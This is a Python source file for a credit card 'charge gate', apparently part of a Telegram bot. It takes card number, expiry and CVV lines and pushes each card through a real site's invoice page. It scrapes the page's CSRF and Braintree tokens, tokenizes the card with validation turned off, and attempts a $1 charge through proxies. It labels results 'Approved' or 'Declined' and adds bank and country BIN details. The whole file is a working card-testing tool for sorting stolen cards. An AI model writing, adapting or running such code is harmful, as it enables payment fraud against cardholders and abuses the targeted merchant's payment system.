# ============================================================
#  Braintree $1 Charge Gate — ported from Dux.py
#  Uses portal.oneome.com to attempt a $1 Braintree charge
# ============================================================

import re
import json
import base64
import random
import time
import requests
import logging

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

SITE_URL = "https://portal.oneome.com"


def _get_bin_info(bin6):
    default = {
        "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN",
        "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": "🏳️",
    }
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                return {
                    "brand": d.get("brand", "UNKNOWN"),
                    "type": d.get("type", "UNKNOWN"),
                    "level": d.get("brand", "UNKNOWN"),
                    "bank": d.get("bank", "UNKNOWN"),
                    "country": d.get("country_name", "UNKNOWN"),
                    "emoji": d.get("country_flag", "🏳️"),
                }
    except Exception:
        pass
    return default


def _process_card(cc, mes, ano, cvv, proxy_dict=None):
    """Single card check — Braintree $1 charge via oneome.com."""
    try:
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        session.headers.update({'User-Agent': ua})

        # Step 1: Visit site
        try:
            session.get(f"{SITE_URL}/", proxies=proxy_dict, timeout=20)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            session.get(f"{SITE_URL}/", timeout=20)

        # Step 2: GET invoice pay page
        try:
            res = session.get(f"{SITE_URL}/invoices/pay", proxies=proxy_dict, timeout=20)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            res = session.get(f"{SITE_URL}/invoices/pay", timeout=20)

        csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', res.text)
        if not csrf_match:
            return {"status": "Error", "response": "CSRF token not found"}
        csrf = csrf_match.group(1)

        # Step 3: Submit billing info
        payload = {
            'csrf_token': csrf,
            'first_name': 'James',
            'last_name': 'Smith',
            'invoice_number': str(random.randint(100000, 999999)),
            'email': f"user{random.randint(1000,9999)}@gmail.com",
            'amount': '1',
            'submit': 'Next',
        }
        try:
            session.post(f"{SITE_URL}/invoices/pay/info", data=payload, proxies=proxy_dict, timeout=20)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            session.post(f"{SITE_URL}/invoices/pay/info", data=payload, timeout=20)

        # Step 4: GET payment page — extract Braintree auth
        try:
            res_pay = session.get(f"{SITE_URL}/invoices/pay/payment", proxies=proxy_dict, timeout=20)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            res_pay = session.get(f"{SITE_URL}/invoices/pay/payment", timeout=20)

        auth_match = re.search(r'authorization:\s*"([^"]+)"', res_pay.text)
        if not auth_match:
            return {"status": "Error", "response": "Braintree auth not found"}

        raw_auth = auth_match.group(1).strip()

        # Decode authorization fingerprint
        try:
            decoded = json.loads(base64.b64decode(raw_auth).decode('utf-8'))
            auth_fp = decoded.get('authorizationFingerprint')
            b_token = f"Bearer {auth_fp}" if auth_fp else f"Bearer {raw_auth}"
        except Exception:
            b_token = f"Bearer {raw_auth}"

        # Step 5: Tokenize via Braintree GraphQL
        gql_headers = {
            'Authorization': b_token,
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
        }

        if len(mes) < 2:
            mes = "0" + mes
        year_full = f"20{ano}" if len(ano) <= 2 else ano

        gql_data = {
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc, 'expirationMonth': mes,
                        'expirationYear': year_full, 'cvv': cvv,
                    },
                    'options': {'validate': False},
                }
            },
        }

        try:
            gql_res = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=gql_headers, json=gql_data, timeout=15,
            )
        except Exception:
            gql_res = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=gql_headers, json=gql_data, timeout=15,
            )

        if gql_res.status_code != 200:
            return {"status": "Error", "response": f"GraphQL HTTP {gql_res.status_code}"}

        gql_json = gql_res.json()
        if 'errors' in gql_json:
            err = gql_json['errors'][0].get('message', 'Unknown')
            if 'cvv' in err.lower() or 'cvc' in err.lower():
                return {"status": "Approved", "response": "CVC Matched ✅"}
            return {"status": "Declined", "response": err}

        if 'data' not in gql_json or 'tokenizeCreditCard' not in gql_json.get('data', {}):
            return {"status": "Error", "response": "Tokenization failed"}

        token = gql_json['data']['tokenizeCreditCard']['token']

        # Step 6: Submit payment
        final_data = {'payment_method_nonce': token, 'csrf_token': csrf}
        try:
            r_final = session.post(
                f"{SITE_URL}/invoices/pay/payment",
                data=final_data, proxies=proxy_dict, timeout=20,
            )
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            r_final = session.post(
                f"{SITE_URL}/invoices/pay/payment",
                data=final_data, timeout=20,
            )

        resp_lower = r_final.text.lower()

        if "payment successful" in resp_lower or "thank you" in resp_lower or "order received" in resp_lower:
            return {"status": "Approved", "response": "Charged $1 ✅"}

        if "insufficient funds" in resp_lower or "insufficient_funds" in resp_lower:
            return {"status": "Approved", "response": "Approved (Insufficient Funds) ✅"}

        if "incorrect cvc" in resp_lower or "cvv_check_fail" in resp_lower:
            return {"status": "Approved", "response": "CVC Matched ✅"}

        if "declined" in resp_lower:
            return {"status": "Declined", "response": "Declined"}

        return {"status": "Declined", "response": "Unknown response"}

    except Exception as e:
        return {"status": "Error", "response": str(e)[:80]}


# ── Public API ──────────────────────────────────────────────

def check_card(cc_line, proxy_dict=None):
    """Entry point for TG bot gate.
    cc_line: "CC|MM|YY|CVV"
    Returns formatted result string.
    """
    start = time.time()

    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")
    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Braintree $1 Charge (OneOME)\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Country: {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Braintree $1 Charge (OneOME)\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site():
    """Health check — can we reach oneome.com and see Braintree?"""
    try:
        r = requests.get(
            f"{SITE_URL}/invoices/pay",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=10, allow_redirects=True,
        )
        alive = r.status_code == 200 and ('braintree' in r.text.lower() or 'csrf_token' in r.text.lower())
        return alive, f"HTTP {r.status_code}" + (" | Braintree found" if alive else " | No Braintree")
    except Exception as e:
        return False, str(e)[:60]
